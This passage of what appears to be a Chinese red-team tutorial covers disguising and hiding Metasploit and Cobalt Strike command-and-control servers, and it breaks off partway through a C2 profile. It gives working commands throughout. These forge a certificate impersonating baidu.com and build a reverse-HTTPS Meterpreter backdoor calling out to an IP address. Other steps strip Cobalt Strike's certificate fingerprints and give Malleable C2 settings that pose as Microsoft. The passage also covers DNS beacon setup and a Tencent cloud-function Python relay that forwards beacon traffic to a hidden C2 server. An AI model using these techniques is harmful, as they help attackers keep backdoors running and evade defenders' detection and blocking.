&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;利用openssl生成证书&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj &amp;quot;/C=UK/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ST=xiaodi/L=xiaodi/O=Development/CN=www.baidu.com&amp;quot; -keyout www.baidu.co m.key -out www.baidu.com.crt &amp;amp;&amp;amp; cat www.baidu.com.key www.baidu.com.crt &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;www.baidu.com.pem &amp;amp;&amp;amp; rm -f www.baidu.com.key www.baidu.com.crt&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF生成绑定证书后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_https LHOST=47.94.236.117 LPO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RT=5566 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell HandlerS SLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true -f exe -o https-b.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF监听上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_https&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 5566&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set HandlerSSLCert /root/www.baidu.com.pem&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set StagerVerifySSLCert true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;impersonate_ssl模块：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;此外Metasploit框架还有一个auxiliary/gather/impersonate_ssl模块，可以用来自动从信任源创建一个虚假证书，十分方便：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use auxiliary/gather/impersonate_ssl&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set RHOST [http://www.baidu.com](http://www.baidu.com)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;cs-通讯特征修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cs-通讯特征修改&#34;&gt;#&lt;/a&gt; CS 通讯特征修改&lt;/h4&gt;
&lt;p&gt;解决 HTTP/S 通讯证书及流量特征被特征标示问题、JDK Keytool 修改 CS 特征。修改默认端口：编辑 teamserver 文件，更改 server port 部分 50000 。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 去除store证书特征：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看证书指纹：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keytool -list -v -keystore cobaltstrike.store&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;生成证书指纹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keytool -keystore cobaltstrike1.store -storepass 123456 -key pass 123456 -genkey -keyalg RSA -alias xiaodi8.com -dname &amp;quot;CN=xiaodi8 e-Szigno Root CA, OU=e-Szigno CA, O=xiaodi8 Ltd., L=Budapest, S=HU, C=HU&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;应用证书指纹&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keytool -importkeystore -srckeystore cobaltstrike1.store -dest&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;keystore cobaltstrike1.store -deststoretype pkcs12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 去除流量通讯特征：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;规则资源：https://github.com/xx0hcd/Malleable-C2-Profiles与https://github.com/FortyNorthSecurity/C2concealer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建C2文件：xiaodi.Profiles&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;写入通讯规则: UA头&amp;amp;GET&amp;amp;POST&amp;amp;心跳&amp;amp;证书等&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;测试规则正常&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./c2lint xiaodi.prifile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c.加载C2规则启动：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./teamserver ip 密码 xiaodi.Profiles&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https-certificate &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set CN &amp;quot;xiaodi8&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set O &amp;quot;Microsoft&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set C &amp;quot;en&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set L &amp;quot;US&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set OU &amp;quot;Microsoft&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set ST &amp;quot;US&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set validity &amp;quot;365&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;d.设置，修改成你的证书名称和证书密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;code-signer&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set keystore &amp;quot;xiaodi.store&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password &amp;quot;xiaodi&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set alias &amp;quot;xiaodi8.com&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;c2-服务器隐藏&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#c2-服务器隐藏&#34;&gt;#&lt;/a&gt; C2 服务器隐藏&lt;/h4&gt;
&lt;p&gt;防封锁处置 IP 地址：域前置、CDN、云函数，网盘第三方上线等&lt;/p&gt;
&lt;p&gt;（ 1 ）cs 采用 CDN 上线&lt;/p&gt;
&lt;p&gt;解决 HTTPS-SSL 通讯被朔源 IP 封锁问题&lt;br&gt;
配置：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvTWdoRmdlZ2RwM2wzdEZFM2hPdmNZdw==&#34;&gt;https://mp.weixin.qq.com/s/MghFgegdp3l3tFE3hOvcYw&lt;/span&gt;&lt;br&gt;
 阿里云备案域名 &amp;amp; 全站加速 CDN 配置、CS 创建监听器 - HTTPS/Stager/Header、生成后门 - 进程网络状态 &amp;amp; 威胁情报平台。&lt;/p&gt;
&lt;p&gt;（ 2 ）域前置 - CDN 配合&lt;br&gt;
此方案在大部分 IDC 不再支持&lt;/p&gt;
&lt;p&gt;（ 3 ）DNS 协议 - 域名记录解析&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 域名解析设置A,NS记录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ns1 ns cs.xxx.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ns2 ns cs.xxx.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cs A xx.xx.xx.xx(CS的IP)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. CS监听器-DNS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Beacon DNS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DNS地址配置：ns1.xxx.com ns2.xxx.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 执行后checkin唤醒&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（ 4 ）云函数 - 腾讯云操作&lt;/p&gt;
&lt;p&gt;创建云函数：腾讯云 - 云产品 - 云函数 - 函数服务 - 新建&lt;/p&gt;
&lt;p&gt;创建函数服务：选择从头开始 - 函数类型选择事件函数 - 函数名称任意 - 运行环境选择 python3.6 - 并复制如下代码并修改 CS 的 IP - 点击完成&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-*- coding: utf8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import json,requests,base64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def main_handler(event, context):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C2=&amp;#x27;https://XXXX&amp;#x27; # 修改为自己C2服务器地址&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path=event[&amp;#x27;path&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;headers=event[&amp;#x27;headers&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(event)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if event[&amp;#x27;httpMethod&amp;#x27;] == &amp;#x27;GET&amp;#x27; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;resp=requests.get(C2+path,headers=headers,verify=False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;resp=requests.post(C2+path,data=event[&amp;#x27;body&amp;#x27;],headers=headers,verify=False)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(resp.headers)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(resp.content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response=&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;isBase64Encoded&amp;quot;: True,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;statusCode&amp;quot;: resp.status_code,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;headers&amp;quot;: dict(resp.headers),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;body&amp;quot;: str(base64.b64encode(resp.content))[2:-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;return response&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;创建触发器：触发方式选择 API 网关触发 - 勾选启用集成响应 - 点击提交配置触发器：点击 API 服务名对触发器进行配置，将路径修改为 /，然后点击立即完成配置 profile 文件 - 触发 URL：&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;set sample_name &amp;quot;t&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set sleeptime &amp;quot;3000&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set jitter &amp;quot;0&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set maxdns &amp;quot;255&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set useragent &amp;quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; 